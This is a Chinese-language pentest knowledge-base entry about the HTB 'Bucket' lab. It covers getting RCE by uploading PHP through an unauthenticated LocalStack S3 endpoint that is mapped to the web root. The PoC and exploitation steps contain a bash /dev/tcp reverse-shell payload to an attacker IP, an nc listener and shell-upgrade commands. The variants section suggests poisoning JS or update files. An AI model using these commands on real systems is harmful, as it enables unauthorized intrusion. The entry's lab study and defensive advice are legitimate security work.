---
id: cloud-s3-unauth-endpoint-php-upload-rce
title: S3 兼容端点无鉴权：伪造凭证 awscli 匿名列桶，向映射 Web 根目录的桶上传 PHP 获得 RCE
type: scenario
domain: cloud
path: cloud
technique: s3-unauth-endpoint-php-upload-rce
tags:
- aws
- s3
- localstack
- unauth
- awscli
- php
- rce
- webshell
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-31
  verified_at: '2026-11-08T16:23:33+08:00'
  notes: 已对照原文与45张图核对：s3.bucket.htb返回running+CORS含x-amz系列头、/health显示s3/dynamodb running、伪造凭证aws configure、s3 ls匿名列出adserver桶、s3 cp abc.php上传、bucket.htb/abc.php解析phpinfo(PHP 7.4.3)、nc收到www-data@bucket反弹shell，链路完整图证；ProxyPass / http://localhost:4566/ 见于000-default.conf截图。dedup与s3-anonymous-enum-export-xml(仅列桶+export.xml凭据窃取,无上传RCE)结论不同,理由成立。未验证点：未在真实AWS/MinIO复现；frontmatter无sources。
url: /docs/cloud/cloud-s3-unauth-endpoint-php-upload-rce/
draft: false
kb_aliases:
- S3 未授权上传
- LocalStack 匿名访问
- 桶 Web 根 RCE
- bucket.htb
---

## 一句话结论

S3 兼容服务（如 LocalStack）暴露无鉴权端点时，`aws configure` 填任意伪造凭证即可通过 CLI 匿名执行 `s3 ls`/`s3 cp`；若桶内容被 Apache+PHP 映射为 Web 根目录（path-style URL `s3.host/adserver/images/bug.jpg` 直接暴露桶名），`s3 cp shell.php s3://adserver/` 后访问对应 Web 路径即获得命令执行，HTB Bucket 靶机完整验证。

## 原理

- **无鉴权判定**：子域 `s3.bucket.htb` 返回 `{"status": "running"}`，CORS 响应头包含 `x-amz-content-sha256`、`x-amz-security-token`、`x-amz-version-id` 等 S3 专属头，且 `/health` 返回 `{"services": {"s3": "running", "dynamodb": "running"}}`——这是 LocalStack 的健康检查格式，说明是自托管 S3 兼容模拟服务；匿名请求即可通过，未校验 AccessKey 签名。
- **伪造凭证即可用 CLI**：awscli 在没有凭证时拒绝发起请求（`Unable to locate credentials`），但服务端不验证凭证时，`aws configure` 随便填 `abcd/abcd` 即可让 CLI 正常签名并发包。`--endpoint-url=http://s3.bucket.htb` 把请求指向目标。
- **Path-style URL 泄露桶名**：页面图片 `http://s3.bucket.htb/adserver/images/bug.jpg` 是 path-style 格式（`endpoint/bucket/key`），直接暴露桶名 `adserver`；`s3 ls` 列出桶确认。
- **桶即 Web 根**：`bucket.htb` 的页面资源来自 `adserver` 桶，即 Apache 把桶对象直接作为 `/var/www/html` 提供（VirtualHost 中 `ProxyPass / http://localhost:4566/` 或同步机制），且对 `.php` 走 PHP 解释器。因此"往桶写对象"等价于"往 Web 根写文件"：上传 `<?php phpinfo();?>` 后访问 `http://bucket.htb/abc.php` 成功解析，PHP 7.4.3。
- **同步延迟**：对象写入后 Web 端可能短暂 404（桶到 Web 根的同步周期），等待后即可访问，弹回 shell。

## 触发条件

- S3 兼容端点（真实 AWS 桶 ACL 公开、MinIO/LocalStack 自托管）可匿名读写；
- 能通过 path-style URL、页面资源路径或 `s3 ls` 确定桶名；
- 桶内容被 Web 服务映射为可执行上下文（PHP/JSP 等），或对象直接落到 Web 根。

## 利用步骤

1. hosts 解析 `bucket.htb`、`s3.bucket.htb`；`s3.bucket.htb/health` 确认服务（S3/DynamoDB running）。
2. 安装 awscli，`aws configure` 填入伪造凭证（如 abcd/abcd/us-east-1/json）。
3. `aws --endpoint-url=http://s3.bucket.htb s3 ls` 列桶，`s3 ls s3://adserver` 查看对象。
4. 本地写 `shell.php`（`<?php exec('/bin/bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"'); ?>`）。
5. `aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver/`。
6. 监听 `nc -nvlp 6666`，访问 `http://bucket.htb/shell.php`（首次可能 404，等待同步），获得 www-data shell。
7. `python3 -c 'import pty;pty.spawn("bash")'` + `stty raw -echo;fg` 升级交互式 shell。

## PoC

```bash
aws configure   # Access Key/Secret 均填 abcd 即可
aws --endpoint-url=http://s3.bucket.htb s3 ls            # -> adserver
echo '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.16/6666 0>&1\""); ?>' > shell.php
aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver/
nc -nvlp 6666    # 访问 http://bucket.htb/shell.php 后收到 www-data 会话
```

## 变体与关联

- 真实 AWS 场景对应"Bucket ACL 公共读写"：`s3 cp` 改为匿名 PUT；桶托管静态站点时同样可投毒页面（存储型 XSS）或覆盖更新包。
- MinIO/Ceph/LocalStack 等自托管服务的 `/health`、`/shell`（DynamoDB JavaScript Shell）等管理路径是识别与横向入口。
- 上传对象后无执行上下文时，可转向覆盖 `.htaccess`、前端 JS、软件更新文件等达到同等效果。
- 关联：[[cloud-object-storage-bucket-acl-misconfig]]、[[cloud-cloud-iam-s3-anonymous-enum-export-xml-privilege-escalation]]、[[cloud-object-storage-response-content-type-xss]]。

## 检测与防御

- S3 兼容服务禁止匿名 ListBucket/PutObject，强制 IAM 签名校验；LocalStack/MinIO 仅绑定内网。
- 监控同一凭证短时间对桶的全量枚举与非常规扩展名（.php/.jsp）上传；Web 根与桶内容做完整性校验（对象版本化 + 变更告警）。
- 不要把对象存储桶直接映射为脚本执行上下文的 Web 根；至少禁用上传前缀的脚本解析。
- 说明：仅适用于授权测试环境。
